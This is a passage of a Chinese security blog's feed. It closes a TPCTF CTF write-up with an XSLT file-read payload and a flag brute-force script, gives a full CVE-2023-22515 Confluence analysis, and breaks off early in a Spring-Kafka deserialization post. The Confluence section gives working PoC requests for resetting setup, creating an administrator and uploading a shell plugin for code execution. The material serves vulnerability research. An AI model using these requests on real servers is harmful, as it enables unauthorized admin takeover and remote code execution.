class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &amp;lt; <span class="number">10000000000000</span>; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">                    total += i.<span class="title function_">toString</span>();</span></span><br><span class="line"><span class="language-javascript">                    history.<span class="title function_">pushState</span>(<span class="number">0</span>, <span class="number">0</span>, total);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#r&#x27;</span>).<span class="property">innerHTML</span> += <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">local file path:   &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;<span class="subst">$&#123; p.className &#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">local file content:&amp;lt;textarea style=&quot;width:100%;height:6rem&quot;&gt;<span class="subst">$&#123; p.innerHTML &#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EXP</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sem = threading.Semaphore(<span class="number">6</span>)</span><br><span class="line">now = <span class="string">&quot;TPCTF&#123;&quot;</span></span><br><span class="line">should_be_next = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params"><span class="built_in">slice</span>: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">global</span> now</span><br><span class="line">    <span class="keyword">global</span> should_be_next</span><br><span class="line">    now = <span class="built_in">slice</span></span><br><span class="line">    should_be_next = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">attempt: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">global</span> now</span><br><span class="line">    <span class="keyword">global</span> should_be_next</span><br><span class="line">    sem.acquire()</span><br><span class="line">    <span class="keyword">if</span> should_be_next:</span><br><span class="line">        sem.release()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    proc = remote(<span class="string">&quot;202.112.238.82&quot;</span>, <span class="string">&quot;23379&quot;</span>)</span><br><span class="line">    proc.sendlineafter(<span class="string">b&quot;File name:&quot;</span>, <span class="string">b&quot;lemon.svg&quot;</span>)</span><br><span class="line">    proc.sendafter(<span class="string">b&quot;Input your file:&quot;</span>, <span class="built_in">open</span>(</span><br><span class="line">        <span class="string">&quot;./test.svg&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().replace(<span class="string">b&quot;LEMON_HIT_FLAG&quot;</span>, attempt.encode()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Trying <span class="subst">&#123;attempt&#125;</span>&quot;</span>)</span><br><span class="line">    proc.sendline(<span class="string">b&quot;EOF&quot;</span>)</span><br><span class="line">    proc.recvuntil(<span class="string">b&quot;Now browsing your website...\n&quot;</span>)</span><br><span class="line">    message = proc.recvline().decode().strip()</span><br><span class="line">    proc.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Message: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> message:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Tried `<span class="subst">&#123;attempt&#125;</span>&#x27; success as <span class="subst">&#123;message&#125;</span>.&quot;</span>)</span><br><span class="line">        push(attempt)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;Bye&quot;</span> <span class="keyword">in</span> message:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[x] Tried `<span class="subst">&#123;attempt&#125;</span>&#x27; failed as <span class="subst">&#123;message&#125;</span>.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">    sem.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alphabets = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> now.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        threads = []</span><br><span class="line">        should_be_next = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> alphabet <span class="keyword">in</span> alphabets:</span><br><span class="line">            attempt = now + alphabet</span><br><span class="line">            t = threading.Thread(target=task, args=(attempt,))</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="built_in">print</span>(now)</span><br></pre></td></tr></table></figure><img src="/2023/11/28/2023-TPCTF-WP/flag2.png" class><h2 id="walk-off-the-earth-SOLVED-working-So1，Drunkbaby，LemonPrefect"><a href="#walk-off-the-earth-SOLVED-working-So1，Drunkbaby，LemonPrefect" class="headerlink" title="walk off the earth | SOLVED| working : So1，Drunkbaby，LemonPrefect"></a>walk off the earth | SOLVED| working : So1，Drunkbaby，LemonPrefect</h2><p>应出题人要求隐去 WP</p><img src="/2023/11/28/2023-TPCTF-WP/flag3.png" class><h2 id="walk-off-the-solar-system-SO1VED-working-Drunkbaby，LemonPrefect"><a href="#walk-off-the-solar-system-SO1VED-working-Drunkbaby，LemonPrefect" class="headerlink" title="walk off the solar system | SO1VED | working : Drunkbaby，LemonPrefect"></a>walk off the solar system | SO1VED | working : Drunkbaby，LemonPrefect</h2><p>请参照 walk off the earth，所用方法和脚本都一致，在此不再赘述。</p><img src="/2023/11/28/2023-TPCTF-WP/flag4.png" class>]]></content>
    
    
    <summary type="html">2023 TPCTF WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-22515 Confluence RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-27T01:48:04.000Z</published>
    <updated>2023-11-27T01:54:30.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22515-Confluence-RCE-漏洞分析"><a href="#CVE-2023-22515-Confluence-RCE-漏洞分析" class="headerlink" title="CVE-2023-22515 Confluence RCE 漏洞分析"></a>CVE-2023-22515 Confluence RCE 漏洞分析</h1><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Confluence 是由 Atlassian 开发的企业级协作软件。2023年10月，Atlassian 官方披露 CVE-2023-22515 Atlassian Confluence Data Center &amp; Server 权限提升漏洞。攻击者可构造恶意请求创建管理员，从而登录系统，造成敏感信息泄漏等。</p><p>如果 Confluence 站点托管在 Atlassian Cloud(域名为：<code>atlassian.net</code>)，则不受此漏洞影响。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>8.0.0 - - 8.0.4<br>8.1.0 - - 8.1.4<br>8.2.0 - - 8.2.3<br>8.3.0 - - 8.3.2<br>8.4.0 - - 8.4.2<br>8.5.0 - - 8.5.1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>安装包 <a class="link" href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives<i class="fas fa-external-link-alt"></i></a></p><p>jar 包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.1.zip  </span><br><span class="line">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.2.zip</span><br></pre></td></tr></table></figure><p>大致的安装可以看 <a class="link" href="https://cn-sec.com/archives/2177640.html">https://cn-sec.com/archives/2177640.html<i class="fas fa-external-link-alt"></i></a></p><p>其中有一步数据库的安装会存在一些问题，首先是新建数据库的时候，对编码有要求</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE confluence <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_bin;</span><br></pre></td></tr></table></figure><p>随后是连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://localhost/confluence?sessionVariables=transaction_isolation=<span class="string">&#x27;READ-COMMITTED&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setupDatabase.png" class><p>在配置数据库时需要指定 <code>READ-COMMITTED</code></p><p>下一步是做调试准备，这里的调试需要找到 Service</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/service.png" class><p>随后在 cmd 里面运行这一个行命令，就会跳出如图所示的框框</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat9w.exe //ES//Confluence151123100612</span><br></pre></td></tr></table></figure><p>随后添加 JAVA_OPTS，进行动调</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据官方的公告，修复建议是给 <code>/setup</code> 打头的接口做鉴权校验</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/setup/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method-omission</span>&gt;</span>*<span class="tag">&lt;/<span class="name">http-method-omission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">auth-constraint</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于 Confluence 这里的框架是基于 S2 的，S2 的大致流程如 su18 师傅的图所示</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/s2Route.png" class><p>也就是说我们现在需要去找一下 <code>/setup/*</code> 接口是怎么被处理的，直接分析是比较难的，所以先 diff 一下代码。</p><ul><li><p>首先 <code>struts2.xml</code> 里面</p></li><li><p>修复版本新增了 <code>struts.override.acceptedPatterns</code></p></li><li><p>修复版本删除了 <code>server-info action</code></p></li></ul><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/strutsXMLDiff.png" class><ul><li>接着是 <code>BootstapStatusProviderImpl</code> 类里面增加了部分内容，对属性 setupPersister 和 applicationConfig 做了限制</li></ul><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BootstapStatusProviderImpl.png" class><p>这里有点没看懂修了什么，所以我先动调观察具体接口是怎么处理的，根据 Struts2 的特性，去到 <code>struts.xml</code> 里面找对应的 <strong>Interceptor</strong>，不难找到具体处理的拦截器是 <code>SetupCheckInterceptor</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setupInterceptor.png" class><p>开始动调，看一下 <code>/setup/setupadministrator.action</code> 接口的逻辑是怎么处理的。</p><p>中间走到 <code>com.atlassian.config.ApplicationConfig#isSetupComplete</code> 时，在新版本的 fix 里面是增加了这一段的 <code>ReadOnlyApplicationConfig</code> 配置的</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/isSetupComplete.png" class><p>所以这里的漏洞利用思路大概就是先动态修改 <code>setupPersister</code> 或 <code>applicationConfig</code>，在触发了这一点之后，能够下一步访问 <code>/setup/setupadministrator.action</code>，重新配置管理员密码。</p><p>这里具体的实现很有意思，su18 师傅的文章说的很明白，我就直接拿过来用了</p><p><a class="link" href="https://su18.org/post/struts2-1/">https://su18.org/post/struts2-1/<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>OGNL 中的根对象即为 ValueStack（值栈），这个对象贯穿整个 Action 的生命周期（每个 Action 类的对象实例会拥有一个 ValueStack 对象）。当Struts 2接收到一个 <code>.action</code> 的请求后，会先建立Action 类的对象实例，但并不会调用 Action 方法，而是先将 Action 类的相应属性放到 ValueStack 的实现类 OgnlValueStack 对象 root 对象的顶层节点（ ValueStack 对象相当于一个栈）。在处理完上述工作后，Struts2 就会调用拦截器链中的拦截器，这些拦截器会根据用户请求参数值去更新 ValueStack 对象顶层节点的相应属性的值，最后会传到 Action 对象，并将 ValueStack 对象中的属性值，赋给 Action 类的相应属性。当调用完所有的拦截器后，才会调用 Action 类的 Action 方法。ValueStack 会在请求开始时被创建，请求结束时消亡。</p></blockquote><p>我们需要找一个 OGNL 的点, 并且这个点能够以某种方式去调用某个类的 getter &#x2F; setter, 以此来配置 applicationConfig 的 setupComplete 字段</p><p>于是去 diff 跟 Struts2 有关的依赖, 即 <code>com.atlassian.struts2_struts-support-1.1.0.jar</code> 和 <code>com.atlassian.struts2_struts-support-1.2.0.jar</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff2.png" class><p>发现修改的类是 <code>SafeParametersInterceptor</code>，这个类会处理所有的输入，所以 <code>server-info.action</code> 这个请求也会经过它</p><p>同时，Confluence 使用了 XWork 框架，它允许通过 HTTP 请求来设置 Java 对象的参数：<a class="link" href="https://developer.atlassian.com/server/confluence/xwork-plugin-complex-parameters-and-security/">XWork Plugin Complex Parameters and Security<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>XWork allows the setting of complex parameters on an XWork action object. For example, a URL parameter of <code>formData.name=Charles</code> will be translated by XWork into the method calls <code>getFormData().setName(&quot;Charles&quot;)</code> by the XWork parameters interceptor. If <code>getFormData()</code> returns null, XWork will attempt to create a new object of the appropriate return type using its default constructor, and then set it with <code>setFormData(newObject)</code></p></blockquote><p>这就允许我们在输入时候传参类似于 <code>?test=a.b.c</code>，动调一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/server-info.action?a.b.c</span><br></pre></td></tr></table></figure><p>这里会先做过滤，跟进 <code>this.filterSafeParameters()</code> 方法，该方法会对传入的参数进行判断，如果包含关键字或者满足正则匹配则返回 false</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/filterSafeParameters.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BLOCKED_PARAMETER_NAMES: actionErrors、actionMessages  </span><br><span class="line">EXCLUDE_CLASS_PATTERN: .*class[^a-z0-9_].*  </span><br><span class="line">SAFE_PARAMETER_NAME_PATTERN: \w+((\.\w+)|(\[\d+\])|(\[<span class="string">&#x27;[\w.]*&#x27;</span>\]))*  </span><br><span class="line">MAP_PARAMETER_PATTERN: .*\[<span class="string">&#x27;[a-zA-Z0-9_]+&#x27;</span>\]</span><br></pre></td></tr></table></figure><p>如果不在黑名单内，最后会调用 <code>isSafeComplexParameterName()</code> 方法，这个方法会检查传入的参数是否调用了当前 action 的某个 getter &#x2F; setter，如果调用了，则判断里面是否有 <code>ParameterSafe</code> 注解。</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/isSafeComplexParameterName.png" class><p>如果没有实现 <code>@ParameterSafe</code> 注解，那么 isSafeMethod 就会返回 false</p><p>这么一看，漏洞成立需要绕过黑名单验证，并且满足 <code>@ParameterSafe</code> 注解，利用条件十分苛刻。继续往下走，回到 <code>com.atlassian.xwork.interceptors.SafeParametersInterceptor#doIntercept</code>，跟进 <code>super.doIntercept()</code> 方法。能够看到这里是跟进到了 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</code> 方法，它会重新处理一遍参数，这就导致上面的黑名单完全没生效。</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/doIntercept.png" class><p>跟进 <code>setParameters()</code> 方法后其实就是 S2 处理 OGNL 语句的那一套，参考 <a class="link" href="https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setParameter.png" class><p>总的来说, 因为 <code>SafeParametersInterceptor.doIntercept()</code> 方法的一些逻辑问题, 导致这个类自身对传入参数的过滤并没有生效, 我们最终还是可以通过 <code>a.b.c=e</code> 的形式去调用当前 action 的 getter &#x2F; setter, 并不需要关心方法本身或者它的 returnType 是否使用了 <code>@ParameterSafe</code> 注解</p><p>到这里思路就很清晰了，我们只需要构造 OGNL 即可，调用某个 Action 里的 setter，让 <code>isSetupComplete=false</code> 即可</p><p>以 ServerInfoAction 为例, 它继承自 ConfluenceActionSupport</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getBootstrapStatusProvider.png" class><p>这里的 <code>getBootstrapStatusProvider()</code> 方法调用了 <code>BootstrapStatusProviderImpl.getInstance()</code>，接下来就可以去 <code>BootstrapStatusProviderImpl</code> 里面寻找调用链，可惜的是这里的 <code>setSetupComplete()</code> 已经用不了了，只能找另外的</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setSetupComplete.png" class><p>最终找到的是 <code>getApplicationConfig()</code> 方法，而在 <code>ApplicationConfig</code> 类里面存在 <code>setSetupComplete()</code> 方法可用</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setSetupCompleteEnd.png" class><p>因为 Confluence 的所有 Action 都继承自 ConfluenceActionSupport, 所以理论上只要访问任意一个使用了 SafeParameterInterceptor 的路由, 无论是 GET 还是 POST 方法都能够利用成功</p><p>于是最后的 PoC 应该是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span><br></pre></td></tr></table></figure><p>在进行覆盖 <code>setupComplete=false</code> 之后重新注册管理员</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/setup/setupadministrator-start.action</span><br></pre></td></tr></table></figure><h2 id="0x05-未授权之后的-RCE"><a href="#0x05-未授权之后的-RCE" class="headerlink" title="0x05 未授权之后的 RCE"></a>0x05 未授权之后的 RCE</h2><p>X1r0z 师傅已经介绍了一种 RCE 的方法，但是利用条件有限，需要 web目录可写并且高权限用户</p><p>其实有一种更简单的方法，看到：<a class="link" href="https://packetstormsecurity.com/files/175225/Atlassian-Confluence-Unauthenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/175225/Atlassian-Confluence-Unauthenticated-Remote-Code-Execution.html<i class="fas fa-external-link-alt"></i></a></p><p>可以通过上传插件实现 RCE，利用工具github上已经存在了：<a class="link" href="https://github.com/AIex-3/confluence-hack/">https://github.com/AIex-3/confluence-hack/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/plugins/servlet/upm</span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/managePlugins.png" class><p>上传 plugin_shellplug.jar，访问 <code>/plugins/servlet/com.jsos.shell/ShellServlet</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rce.png" class><h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" href="http://www.bmth666.cn/2023/11/05/CVE-2023-22515-Confluence-Broken-Authentication/">http://www.bmth666.cn/2023/11/05/CVE-2023-22515-Confluence-Broken-Authentication/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://exp10it.cn/2023/10/atlassian-confluence-cve-2023-22515-%E5%88%86%E6%9E%90/">https://exp10it.cn/2023/10/atlassian-confluence-cve-2023-22515-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2023-22515 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-34040 Kafka 反序列化 RCE</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/</id>
    <published>2023-11-27T01:47:49.000Z</published>
    <updated>2023-11-27T01:52:03.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-34040-Kafka-反序列化-RCE"><a href="#CVE-2023-34040-Kafka-反序列化-RCE" class="headerlink" title="CVE-2023-34040 Kafka 反序列化 RCE"></a>CVE-2023-34040 Kafka 反序列化 RCE</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Kafka 是 Spring Framework 生态系统中的一个模块，用于简化在 Spring 应用程序中集成 Apache Kafka 的过程，记录 (record) 指 Kafka 消息中的一条记录。</p><p>受影响版本中默认未对记录配置 <code>ErrorHandlingDeserializer</code>，当用户将容器属性 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 设置为 true(默认为 false)，并且允许不受信任的源发布到 Kafka 主题中时，攻击者可将恶意 payload 注入到 Kafka 主题中，当反序列化记录头时远程执行任意代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.8.1 &lt;&#x3D; Spring-Kafka &lt;&#x3D; 2.9.10<br>3.0.0 &lt;&#x3D; Spring-Kafka &lt;&#x3D; 3.0.9</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这一个漏洞所影响的组件其实是 Spring-Kafka，严格意义上来说并不算是 kafka 的漏洞，应该算是 Spring 的漏洞。</p><h3 id="漏洞前置知识"><a href="#漏洞前置知识" class="headerlink" title="漏洞前置知识"></a>漏洞前置知识</h3><p>先来看一看 SpringBoot 和 Kafka 是怎么完成通讯&#x2F;消费的</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SpringBootToKafka.png" class><p><strong>工作流程如下</strong></p><p>1、生产者将消息发送到 Kafka 集群中的某个 Broker（也可以是多个）<br>2、Kafka 集群将消息存储在一个或多个分区中，并为每个分区维护一个偏移量<br>3、消费者订阅一个或多个主题，并从 Kafka 集群中读取消息。<br>4、消费者按顺序读取每个分区中的消息，并跟踪每个分区的偏移量。</p><ul><li>ErrorHandlingDeserializer：是 Kafka中的一种反序列化器（Deserializer），它可以在反序列化过程中处理异常和错误。</li><li>checkDeserExWhenKeyNull &amp;&amp; checkDeserExWhenValueNull：是 Kafka 中的一种序列化器（Serializer），它可以在序列化过程中检查键（key&#x2F;value）是否为 null，并在发现值为 null 时抛出异常。</li></ul><p>再简单整理一下漏洞条件</p><blockquote><p>在受到影响的版本中，默认未对记录配置 <code>ErrorHandlingDeserializer</code><br>容器属性 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 设置为 true</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>其中需要我们起一个 Kafka 的服务，用来接收消息，本机上起比较麻烦，可以在 vps 上用 docker 迅速搭建，且需注意，Kafka 要能够接受外连，<code>docker-compose.yml</code> 如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">zookeeper:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">zookeeper</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;2181:2181&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">zookeeper</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">wurstmeister/kafka</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    